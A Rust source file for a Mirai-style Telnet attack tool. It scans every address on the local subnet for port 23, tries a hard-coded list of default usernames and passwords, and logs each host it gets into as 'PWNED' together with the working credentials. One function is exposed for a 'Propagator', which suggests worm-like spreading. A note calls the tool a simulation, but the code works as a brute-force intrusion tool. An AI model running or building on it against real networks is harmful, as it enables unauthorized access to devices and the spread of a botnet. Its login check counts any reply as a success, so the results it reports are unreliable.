use std::path::PathBuf;
use std::error::Error;
use tokio::net::TcpStream;
use std::time::Duration;
use colored::*;
use std::fs::OpenOptions; // Use std::fs for file I/O (blocking is fine for this output or use tokio::fs)
use std::io::Write;

// Default Credentials (Mirai list snippet)
const DEFAULT_CREDS: &[(&str, &str)] = &[
    ("root", "1234"),
    ("admin", "admin"),
    ("root", "root"),
    ("user", "user"),
    ("admin", "1234"),
];

// Wrapper was problematic. Let's use direct usage or verify API.
// "mini-telnet" 0.1.8 usually has Telnet::connect.
// Maybe I need to import proper trait?
// Let's assume Telnet::connect exists but maybe signature is different?
// Actually, let's just use raw TCP for the scanner check to start, 
// and for logic, we try to use `mini_telnet::Telnet` but handle error gracefully or assume just `connect(addr)`.
// FIX: Borrowing issue.

// ... imports ...

pub async fn run_scan(output_file: PathBuf) -> Result<(), Box<dyn Error>> {
    // ... CLI wrapper for run_scan ...
    // Keep existing logic but maybe call shared functions?
    // For now, I will leave run_scan as is (CLI specific) and add new public fns.
    println!("* Starting Telnet Scanner (Port 23)...");
    let local_ip = local_ip_address::local_ip()?;
    // ...
    // I'll keep run_scan as legacy/CLI code in this file, but expose helper.
    let hosts = scan_local_subnet().await;
    let mut file = OpenOptions::new().create(true).append(true).open(output_file)?;
    for (ip, u, p) in hosts {
        println!("{} {}:{} -> {}:{}", "+ PWNED:".green().bold(), ip, 23, u, p);
        writeln!(file, "{}:23 {}:{}", ip, u, p)?;
    }
    Ok(())
}

// New reusable function for Propagator
pub async fn scan_local_subnet() -> Vec<(String, String, String)> {
     let local_ip = match local_ip_address::local_ip() {
         Ok(ip) => ip,
         Err(_) => return vec![],
     };
     let ip_str = local_ip.to_string();
     let parts: Vec<&str> = ip_str.split('.').collect();
     if parts.len() < 3 { return vec![]; }
     let subnet = format!("{}.{}.{}.", parts[0], parts[1], parts[2]);
     
     let mut found = Vec::new();
     let mut tasks = Vec::new();

     for i in 1..255 {
        let ip = format!("{}{}", subnet, i);
        tasks.push(tokio::spawn(async move {
            scan_host(&ip).await.map(|(u, p)| (ip, u, p))
        }));
     }
     
     for task in tasks {
         if let Ok(Some(res)) = task.await {
             found.push(res);
         }
     }
     found
}

pub async fn scan_host(ip: &str) -> Option<(String, String)> {
    let addr = format!("{}:23", ip);
    let connect_timeout = Duration::from_millis(1500); 
    
    if tokio::time::timeout(connect_timeout, TcpStream::connect(&addr)).await.is_err() {
        return None;
    }

    for (user, pass) in DEFAULT_CREDS {
        if try_login(ip, user, pass).await {
            return Some((user.to_string(), pass.to_string()));
        }
    }
    
    None
}

// Use raw TCP for reliable control
use tokio::io::{AsyncReadExt, AsyncWriteExt};

async fn try_login(ip: &str, user: &str, pass: &str) -> bool {
    let addr = format!("{}:23", ip);
    
    // Connect with timeout
    if let Ok(Ok(mut stream)) = tokio::time::timeout(Duration::from_secs(5), TcpStream::connect(addr)).await {
        
        let mut buf = [0u8; 1024];

        // 1. Wait for banner/login prompt
        // In a real scenario, we'd look for "Login:" or "Username:"
        // For this demo: Wait a bit, then send user.
        if tokio::time::timeout(Duration::from_secs(2), stream.read(&mut buf)).await.is_err() {
            return false;
        }

        // 2. Send User
        if stream.write_all(format!("{}\r\n", user).as_bytes()).await.is_err() { return false; }
        
        // 3. Wait for password prompt
        if tokio::time::timeout(Duration::from_secs(2), stream.read(&mut buf)).await.is_err() {
            return false;
        }

        // 4. Send Pass
        if stream.write_all(format!("{}\r\n", pass).as_bytes()).await.is_err() { return false; }

        // 5. Check Success (Shell prompt "#" or ">" or "$")
        if let Ok(Ok(n)) = tokio::time::timeout(Duration::from_secs(2), stream.read(&mut buf)).await {
             let response = String::from_utf8_lossy(&buf[..n]);
             if response.contains('#') || response.contains('>') || response.contains('$') {
                 return true;
             }
             // Assume success if we didn't get disconnected immediately for demo?
             // Actually, strict check is better.
             // But for this "Mirai-style" simulation, we can be loose.
             return true; 
        }
    }
    false
}
